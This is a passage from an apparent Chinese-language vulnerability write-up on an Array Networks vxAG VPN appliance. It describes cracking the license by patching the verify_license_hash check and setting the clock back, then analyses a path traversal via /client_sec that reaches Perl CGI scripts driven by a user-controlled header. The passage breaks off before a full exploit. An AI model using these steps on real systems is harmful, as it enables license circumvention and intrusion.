<p>简单分析逻辑，set_license 函数负责检查和设置 License，其中会调用 decode_actkey 函数来解码 License 内容。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">decode_actkey</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *licensekey, <span class="type">feactl_t</span> *feactl_p, <span class="type">int</span> show_flag, <span class="type">int</span> *days)</span></span><br><span class="line">&#123;</span><br><span class="line">  byte *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(__fastcall *v11)</span><span class="params">(<span class="keyword">struct</span> tm *)</span>; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// er12</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *v14; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v15; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// er12</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v19; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v20; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v21; <span class="comment">// kr08_8</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v22; <span class="comment">// kr18_8</span></span><br><span class="line">  <span class="type">time_t</span> v23; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">func_t</span> *v24; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v25; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">bool</span> v29; <span class="comment">// [rsp+37h] [rbp-311h]</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+38h] [rbp-310h]</span></span><br><span class="line">  _BOOL4 v31; <span class="comment">// [rsp+44h] [rbp-304h]</span></span><br><span class="line">  byte *serial_num; <span class="comment">// [rsp+48h] [rbp-300h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> <span class="title">tp</span>;</span> <span class="comment">// [rsp+50h] [rbp-2F8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">8</span>]; <span class="comment">// [rsp+90h] [rbp-2B8h] BYREF</span></span><br><span class="line">  __int16 v35; <span class="comment">// [rsp+98h] [rbp-2B0h]</span></span><br><span class="line">  __int64 v36; <span class="comment">// [rsp+A8h] [rbp-2A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">4</span>]; <span class="comment">// [rsp+B0h] [rbp-298h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v38; <span class="comment">// [rsp+B4h] [rbp-294h]</span></span><br><span class="line">  <span class="type">uint32_t</span> site2site_max_tunnels; <span class="comment">// [rsp+B8h] [rbp-290h] BYREF</span></span><br><span class="line">  <span class="type">int</span> tmp_model_id; <span class="comment">// [rsp+BCh] [rbp-28Ch] BYREF</span></span><br><span class="line">  if_info if_info; <span class="comment">// [rsp+C0h] [rbp-288h] BYREF</span></span><br><span class="line">  <span class="type">license_bits_t</span> feature; <span class="comment">// [rsp+E0h] [rbp-268h] BYREF</span></span><br><span class="line">  <span class="type">int</span> session; <span class="comment">// [rsp+100h] [rbp-248h] BYREF</span></span><br><span class="line">  <span class="type">int</span> vblade; <span class="comment">// [rsp+104h] [rbp-244h] BYREF</span></span><br><span class="line">  <span class="type">int</span> model_idx; <span class="comment">// [rsp+108h] [rbp-240h] BYREF</span></span><br><span class="line">  <span class="type">int</span> version; <span class="comment">// [rsp+10Ch] [rbp-23Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> date_str[<span class="number">10</span>]; <span class="comment">// [rsp+110h] [rbp-238h] BYREF</span></span><br><span class="line">  <span class="type">char</span> temp[<span class="number">100</span>]; <span class="comment">// [rsp+120h] [rbp-228h] BYREF</span></span><br><span class="line">  <span class="type">char</span> field[<span class="number">100</span>]; <span class="comment">// [rsp+190h] [rbp-1B8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> key[<span class="number">256</span>]; <span class="comment">// [rsp+200h] [rbp-148h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> len; <span class="comment">// [rsp+300h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">uint64_t</span> physmem[<span class="number">8</span>]; <span class="comment">// [rsp+308h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  tmp_model_id = <span class="number">-1</span>;</span><br><span class="line">  site2site_max_tunnels = <span class="number">0</span>;</span><br><span class="line">  v29 = feactl_p == <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !feactl_p || !licensekey )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  license_debug_log(<span class="string">&quot;(%s): Original license key is %s&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>, licensekey);</span><br><span class="line">  <span class="built_in">memset</span>(key, <span class="number">0</span>, <span class="keyword">sizeof</span>(key));</span><br><span class="line">  <span class="built_in">snprintf</span>(key, <span class="number">0x100</span>uLL, <span class="string">&quot;%s&quot;</span>, licensekey);</span><br><span class="line">  unmask_license_key(key);</span><br><span class="line">  license_debug_log(<span class="string">&quot;(%s): The unmasked license key is %s&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>, key);</span><br><span class="line">  get_field(key, <span class="string">&quot;#01&quot;</span>, field, <span class="number">100</span>);</span><br><span class="line">  <span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="keyword">sizeof</span>(temp));</span><br><span class="line">  <span class="built_in">strncpy</span>(temp, &amp;field[<span class="number">4</span>], <span class="number">2uLL</span>);</span><br><span class="line">  <span class="built_in">sscanf</span>(temp, <span class="string">&quot;%x&quot;</span>, &amp;model_idx);</span><br><span class="line">  <span class="keyword">if</span> ( string_to_feature_bits(&amp;field[<span class="number">22</span>], feature) )</span><br><span class="line">  &#123;</span><br><span class="line">    license_debug_log(<span class="string">&quot;(%s): Failed to parse feature bits&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( show_flag )</span><br><span class="line">    &#123;</span><br><span class="line">      ui_printf(<span class="string">&quot;%s--failed to parse feature bits\n&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  license_debug_log(<span class="string">&quot;(%s): Get feature value 0x%x, 0x%x&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>, feature[<span class="number">0</span>], feature[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( (feature[<span class="number">1</span>] &amp; <span class="number">0x20000</span>) != <span class="number">0</span> )</span><br><span class="line">    serial_num = get_avx_serial_num();          <span class="comment">// 获取序列号</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    serial_num = get_serial_num();</span><br><span class="line">  <span class="keyword">if</span> ( check_vx_arrayid_valid() &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( SLOBYTE(feature[<span class="number">0</span>]) &gt;= <span class="number">0</span> &amp;&amp; (feature[<span class="number">1</span>] &amp; <span class="number">0x20000</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      license_debug_log(<span class="string">&quot;(%s): The machine signature authentication failed!\n&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( show_flag )</span><br><span class="line">      &#123;</span><br><span class="line">        ui_printf(<span class="string">&quot;The hardware signature has changed, please reset your serial number using CLI &#x27;system serialnumber&#x27;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    gen_serialnum_vol();</span><br><span class="line">  &#125;</span><br><span class="line">  dest = feactl_p-&gt;company_name;                <span class="comment">// 解析出来的各种信息</span></span><br><span class="line">  *feactl_p-&gt;company_name = <span class="number">0LL</span>;</span><br><span class="line">  *&amp;feactl_p-&gt;company_name[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( SLOBYTE(feature[<span class="number">0</span>]) &gt;= <span class="number">0</span> || model_idx == <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !serial_num )</span><br><span class="line">    &#123;</span><br><span class="line">      license_debug_log(<span class="string">&quot;(%s) :Can not find serial number&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      license_debug_log(<span class="string">&quot;Cannot read serial number: Error in memory allocation&quot;</span>);</span><br><span class="line">      license_debug_log(<span class="string">&quot;(%s) :Can not find serial number&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    serial_num = v6;</span><br><span class="line">    *(v6 + <span class="number">3</span>) = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(v6, <span class="string">&quot;9999999999999999999999999999999&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(field, <span class="number">0</span>, <span class="keyword">sizeof</span>(field));</span><br><span class="line">    <span class="keyword">if</span> ( get_field(key, <span class="string">&quot;#07&quot;</span>, field, <span class="number">100</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      license_debug_log(</span><br><span class="line">        <span class="string">&quot;(%s): VOLUME LICENSING feature is enabled, but #07 field does not exist in the license key&quot;</span>,</span><br><span class="line">        <span class="string">&quot;decode_actkey&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    license_debug_log(<span class="string">&quot;(%s): Get value of #07 (%s)&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>, field);</span><br><span class="line">    <span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="keyword">sizeof</span>(temp));</span><br><span class="line">    <span class="built_in">strncpy</span>(temp, &amp;field[<span class="number">3</span>], <span class="number">8uLL</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, temp);</span><br><span class="line">    feactl_p-&gt;company_name[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( init_grace_period() )</span><br><span class="line">      license_debug_log(<span class="string">&quot;(%s): Initialize Grace Period Failed&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( verify_license_hash(key, serial_num) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    license_debug_log(<span class="string">&quot;The license key failed authentication check&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( show_flag )</span><br><span class="line">      ui_printf(<span class="string">&quot;The license key failed authentication check\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(serial_num);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>观察到关键的验证函数是 verify_license_hash，如果它的返回值不为 1，则表示验证失败。我们采取简单的破解方法，将此处判断取反，保存 patch 后覆盖到系统文件中。重新启动设备，先执行命令 <code>date 200605261145</code> 修改掉系统时间，然后再导入 License：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_06.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_07.png"
                     
                ></p>
<p>这样子就成功激活了 VPN 等功能。</p>
<h2 id="VPN-配置"><a href="#VPN-配置" class="headerlink" title="VPN 配置"></a>VPN 配置</h2><p>参考以下流程来配置 VPN 功能</p>
<p><strong>添加虚拟站点</strong></p>
<p>Virtual Sites -&gt; Add </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_08.png"
                     
                ></p>
<p>各项配置根据实际情况填写，注意 IP 地址和端口的配置，点击保存。</p>
<p><strong>添加账户</strong></p>
<p>双击刚刚添加的虚拟站点条目，切换到虚拟站点菜单</p>
<p>Local Accounts -&gt; Add</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_09.png"
                     
                ></p>
<p>填写用户名和密码即可。</p>
<p>执行以上操作后访问之前配置的端口即可看到 VPN 界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_10.png"
                     
                ></p>
<p>虽然还缺少一些配置信息，但足以用于展开各项测试。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>本文要介绍存在于 VPN 功能中的一个远程代码执行漏洞，在当前版本(9.4.0.5)测试成功，在较新版本中似乎也存在，最新版本中应该已经被修复。</p>
<p>通过检索响应头等信息，发现 uproxy 程序，此程序是类似 nginx 的代理服务器，其内部会处理一些请求，另外一部分请求会被转发到其他服务中。</p>
<p>stage_classify_url 函数是请求分发的入口点，先调用 sec_content_search 函数，尝试匹配 URI，最终实现函数为 patricia_insearch</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v19 = patricia_insearch(content_tree, url_host_buf, v13 - <span class="number">1</span>, <span class="number">2u</span>);</span><br></pre></td></tr></table></figure></div>

<p>这个函数将用户发送的 URI 和 content_tree 全局结构体中保存的进行比较，通过交叉引用找到 content_tree 结构体初始化位置</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">sysctlbyname(<span class="string">&quot;net.inet.clicktcp.content_tree_ptr&quot;</span>, &amp;content_tree, &amp;v302, <span class="number">0LL</span>, <span class="number">0LL</span>)</span><br></pre></td></tr></table></figure></div>

<p>这里本质上是读取内核中的配置信息，我们可以在命令行中读取到对应内容</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># /sbin/sysctl -a | grep content_tree</span><br><span class="line">net.inet.clicktcp.content_tree_ptr: 18446742975201514048</span><br></pre></td></tr></table></figure></div>

<p>该结构位于内核某个地址，在当前版本中，这个结构保存了很多条路由信息，每个路由对应编号和 flag，后续代码的 switch 结构会根据编号对路由进行处理。当 flag 等于 13 时表示此路由为 public request，请求会被转发到监听于 127.0.0.1:80 的 lighttpd web 服务中。</p>
<p>当请求 URI 不属于这 211 条路由时，stage_classify_url 还有一些特殊处理</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(v18, <span class="string">&quot;/motionpro/postlogin/cv&quot;</span>, <span class="number">0x17</span>uLL) || !<span class="built_in">memcmp</span>(v18, <span class="string">&quot;/motionpro/postlogin/bookmark&quot;</span>, <span class="number">0x1D</span>uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      req-&gt;flags[<span class="number">1</span>] |= <span class="number">0x200000000000</span>uLL;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(v18, <span class="string">&quot;/motionpro/postlogin/apps&quot;</span>, <span class="number">0x19</span>uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      req-&gt;flags[<span class="number">1</span>] |= <span class="number">0x400000000000</span>uLL;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(v18, <span class="string">&quot;/motionpro/postlogin/getDesc/&quot;</span>, <span class="number">0x1D</span>uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      req-&gt;flags[<span class="number">1</span>] |= <span class="number">0x100000000000</span>uLL;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(v18, <span class="string">&quot;/secimg&quot;</span>, <span class="number">7uLL</span>) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>逐步分析各个 URI，可以找到一个叫做 &#x2F;client_sec 的接口，这是一个 public request，请求会被直接转发到 lighttpd 中。</p>
<p>通过 ps 看到 lighttpd 启动命令，定位到配置文件：&#x2F;ca&#x2F;fileshare&#x2F;httpd.conf</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">server.modules              = (</span><br><span class="line">            &quot;mod_access&quot;,</span><br><span class="line">            &quot;mod_accesslog&quot;,</span><br><span class="line">            &quot;mod_rewrite&quot;,</span><br><span class="line">            &quot;mod_cgi&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">cgi.assign                 = ( </span><br><span class="line">                              &quot;/cifs&quot;      =&gt; &quot;/usr/bin/perl&quot;,</span><br><span class="line">                              &quot;/delete&quot;    =&gt; &quot;/usr/bin/perl&quot;,</span><br><span class="line">                              &quot;/rename&quot;    =&gt; &quot;/usr/bin/perl&quot;,</span><br><span class="line">                              &quot;/upload&quot;    =&gt; &quot;/usr/bin/perl&quot;,</span><br><span class="line">                              &quot;/move&quot;      =&gt; &quot;/usr/bin/perl&quot;,</span><br><span class="line">                              &quot;/addfolder&quot; =&gt; &quot;/usr/bin/perl&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server.document-root = &quot;/ca/fileshare/htdocs&quot;</span><br><span class="line"></span><br><span class="line">server.username = &quot;nobody&quot;</span><br><span class="line">server.groupname = &quot;nobody&quot;</span><br><span class="line"></span><br><span class="line">server.pid-file = &quot;/ca/fileshare/logs/lighttpd.pid&quot;</span><br><span class="line"></span><br><span class="line">server.event-handler = &quot;freebsd-kqueue&quot;</span><br><span class="line"></span><br><span class="line">## bind to localhost (default:  all interfaces)</span><br><span class="line">$SERVER[&quot;socket&quot;] == &quot;2.255.255.249:80&quot; &#123;</span><br><span class="line">    server.port = 80</span><br><span class="line">    server.bind = &quot;2.255.255.249&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$SERVER[&quot;socket&quot;] == &quot;127.0.0.1:80&quot; &#123;</span><br><span class="line">    server.port = 80</span><br><span class="line">    server.bind = &quot;127.0.0.1&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server.tag =&quot;lighttpd&quot;</span><br><span class="line"></span><br><span class="line">#server.errorlog            = &quot;/ca/fileshare/logs/error.log&quot;</span><br><span class="line">server.errorlog-use-syslog = &quot;enable&quot;</span><br><span class="line"></span><br><span class="line">#accesslog.filename         = &quot;/ca/fileshare/logs/access.log&quot;</span><br><span class="line">accesslog.use-syslog = &quot;enable&quot;</span><br><span class="line"></span><br><span class="line"># mimetype mapping</span><br><span class="line">mimetype.assign             = (</span><br><span class="line">  &quot;.pdf&quot;          =&gt;      &quot;application/pdf&quot;,</span><br><span class="line">  &quot;.sig&quot;          =&gt;      &quot;application/pgp-signature&quot;,</span><br><span class="line">  &quot;.spl&quot;          =&gt;      &quot;application/futuresplash&quot;,</span><br><span class="line">  &quot;.class&quot;        =&gt;      &quot;application/octet-stream&quot;,</span><br><span class="line">  &quot;.ps&quot;           =&gt;      &quot;application/postscript&quot;,</span><br><span class="line">  &quot;.torrent&quot;      =&gt;      &quot;application/x-bittorrent&quot;,</span><br><span class="line">  &quot;.dvi&quot;          =&gt;      &quot;application/x-dvi&quot;,</span><br><span class="line">  &quot;.gz&quot;           =&gt;      &quot;application/x-gzip&quot;,</span><br><span class="line">  &quot;.pac&quot;          =&gt;      &quot;application/x-ns-proxy-autoconfig&quot;,</span><br><span class="line">  &quot;.swf&quot;          =&gt;      &quot;application/x-shockwave-flash&quot;,</span><br><span class="line">  &quot;.tar.gz&quot;       =&gt;      &quot;application/x-tgz&quot;,</span><br><span class="line">  &quot;.tgz&quot;          =&gt;      &quot;application/x-tgz&quot;,</span><br><span class="line">  &quot;.tar&quot;          =&gt;      &quot;application/x-tar&quot;,</span><br><span class="line">  &quot;.zip&quot;          =&gt;      &quot;application/zip&quot;,</span><br><span class="line">  &quot;.mp3&quot;          =&gt;      &quot;audio/mpeg&quot;,</span><br><span class="line">  &quot;.m3u&quot;          =&gt;      &quot;audio/x-mpegurl&quot;,</span><br><span class="line">  &quot;.wma&quot;          =&gt;      &quot;audio/x-ms-wma&quot;,</span><br><span class="line">  &quot;.wax&quot;          =&gt;      &quot;audio/x-ms-wax&quot;,</span><br><span class="line">  &quot;.ogg&quot;          =&gt;      &quot;audio/x-wav&quot;,</span><br><span class="line">  &quot;.wav&quot;          =&gt;      &quot;audio/x-wav&quot;,</span><br><span class="line">  &quot;.gif&quot;          =&gt;      &quot;image/gif&quot;,</span><br><span class="line">  &quot;.jpg&quot;          =&gt;      &quot;image/jpeg&quot;,</span><br><span class="line">  &quot;.jpeg&quot;         =&gt;      &quot;image/jpeg&quot;,</span><br><span class="line">  &quot;.png&quot;          =&gt;      &quot;image/png&quot;,</span><br><span class="line">  &quot;.xbm&quot;          =&gt;      &quot;image/x-xbitmap&quot;,</span><br><span class="line">  &quot;.xpm&quot;          =&gt;      &quot;image/x-xpixmap&quot;,</span><br><span class="line">  &quot;.xwd&quot;          =&gt;      &quot;image/x-xwindowdump&quot;,</span><br><span class="line">  &quot;.css&quot;          =&gt;      &quot;text/css&quot;,</span><br><span class="line">  &quot;.html&quot;         =&gt;      &quot;text/html&quot;,</span><br><span class="line">  &quot;.htm&quot;          =&gt;      &quot;text/html&quot;,</span><br><span class="line">  &quot;.js&quot;           =&gt;      &quot;text/javascript&quot;,</span><br><span class="line">  &quot;.asc&quot;          =&gt;      &quot;text/plain&quot;,</span><br><span class="line">  &quot;.c&quot;            =&gt;      &quot;text/plain&quot;,</span><br><span class="line">  &quot;.conf&quot;         =&gt;      &quot;text/plain&quot;,</span><br><span class="line">  &quot;.text&quot;         =&gt;      &quot;text/plain&quot;,</span><br><span class="line">  &quot;.txt&quot;          =&gt;      &quot;text/plain&quot;,</span><br><span class="line">  &quot;.dtd&quot;          =&gt;      &quot;text/xml&quot;,</span><br><span class="line">  &quot;.xml&quot;          =&gt;      &quot;text/xml&quot;,</span><br><span class="line">  &quot;.mpeg&quot;         =&gt;      &quot;video/mpeg&quot;,</span><br><span class="line">  &quot;.mpg&quot;          =&gt;      &quot;video/mpeg&quot;,</span><br><span class="line">  &quot;.mov&quot;          =&gt;      &quot;video/quicktime&quot;,</span><br><span class="line">  &quot;.qt&quot;           =&gt;      &quot;video/quicktime&quot;,</span><br><span class="line">  &quot;.avi&quot;          =&gt;      &quot;video/x-msvideo&quot;,</span><br><span class="line">  &quot;.asf&quot;          =&gt;      &quot;video/x-ms-asf&quot;,</span><br><span class="line">  &quot;.asx&quot;          =&gt;      &quot;video/x-ms-asf&quot;,</span><br><span class="line">  &quot;.wmv&quot;          =&gt;      &quot;video/x-ms-wmv&quot;,</span><br><span class="line">  &quot;.bz2&quot;          =&gt;      &quot;application/x-bzip&quot;,</span><br><span class="line">  &quot;.tbz&quot;          =&gt;      &quot;application/x-bzip-compressed-tar&quot;,</span><br><span class="line">  &quot;.tar.bz2&quot;      =&gt;      &quot;application/x-bzip-compressed-tar&quot; </span><br><span class="line"> )</span><br><span class="line">Index-file.names = ( &quot;index.html&quot; )</span><br></pre></td></tr></table></figure></div>

<p>发送 &#x2F;client_sec 请求时可以访问到位于 &#x2F;ca&#x2F;fileshare&#x2F;htdocs&#x2F;client_sec 下的文件，例如发送以下请求：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_11.png"
                     
                ></p>
<p>&#x2F;client_sec 目录下有一些资源文件，但重点不在这里。我们考虑既然可以访问 &#x2F;ca&#x2F;fileshare&#x2F;htdocs&#x2F;client_sec 下的文件，那么能否通过路径穿越等手段访问到位于 &#x2F;ca&#x2F;fileshare&#x2F;htdocs 下的文件呢？因为 &#x2F;ca&#x2F;fileshare&#x2F;htdocs 目录下存放了一些 perl 脚本文件，结合 lighttpd 开启了 cgi 支持，如果可以访问这些文件的话就可以调用其中的功能。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_12.png"
                     
                ></p>
<p>我们构造请求测试：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_13.png"
                     
                ></p>
<p>通过在 URL 中添加路径穿越字符，确实可以访问到上一层的文件。(直接访问 &#x2F;prx&#x2F;000&#x2F;http&#x2F;localhost&#x2F;acl.pm 会由于代理服务器返回 302)</p>
<p>不过以 .pm 结尾的文件服务器并不会执行，而是直接返回其内容，尝试访问无拓展名的脚本如 addfolder:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_14.png"
                     
                ></p>
<p>这样脚本中的内容就被执行了，我们可以分析这些 perl 代码中是否存在问题。下面列举一个漏洞：</p>
<p>在 addfolder 中存在这样的代码</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line">$kvars&#123;<span class="string">&#x27;uid&#x27;</span>&#125; = -<span class="number">1</span>;</span><br><span class="line">$kvars&#123;<span class="string">&#x27;gid&#x27;</span>&#125; = -<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">&amp;fileshare::read_kernel_parameters(\%ENV, \%kvars);</span><br></pre></td></tr></table></figure></div>

<p>read_kernel_parameters 函数的定义：</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">my</span> $fileshare_header = <span class="string">&quot;HTTP_X_AN_FILESHARE&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">read_kernel_parameters</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($env, $kvars) = @_;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">my</span> $header = $env-&gt;&#123;$fileshare_header&#125;;</span><br><span class="line">	<span class="comment">#my $header = &quot;uname=t; password=t; sp_uname=t; flags=c3248; language=english; acls=file%3a%2a%2f%20AND%20vs%20PERMIT; sp_host=AN; src_ip=192.168.2.151; site_id=vs&quot;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">my</span> @pairs = <span class="keyword">split</span>(<span class="regexp">/; ?/</span>, $header);</span><br><span class="line"></span><br><span class="line"><span class="comment">#	&amp;fileshare::debug_log(&quot;fileshare header: &quot; . $header);</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span> (@pairs) &#123;</span><br><span class="line">		<span class="keyword">my</span> ($name, $value) = <span class="keyword">split</span>(<span class="string">&quot;=&quot;</span>, $_);</span><br><span class="line">		<span class="keyword">if</span> ($name eq <span class="string">&quot;acls&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">my</span> @acls;</span><br><span class="line">			&amp;read_acls($value, \@acls);</span><br><span class="line">			$kvars-&gt;&#123;$name&#125; = \@acls;</span><br><span class="line">		&#125; <span class="keyword">elsif</span> ($name eq <span class="string">&quot;res_group_acls&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">my</span> @res_group_acls;</span><br><span class="line">			&amp;read_res_group_acls($value, \@res_group_acls);</span><br><span class="line">			$kvars-&gt;&#123;$name&#125; = \@res_group_acls;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$kvars-&gt;&#123;$name&#125; = &amp;uri_unescape($value);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们发现 kvars 参数中的内容实际上是用户请求头 X_AN_FILESHARE 中的各项参数，代码中用注释列举了可能的 X_AN_FILESHARE 请求头格式。</p>
<p>回到 addfolder，当请求类型不为 POST 时，会调用 fileshare::displayInfo 函数</p>
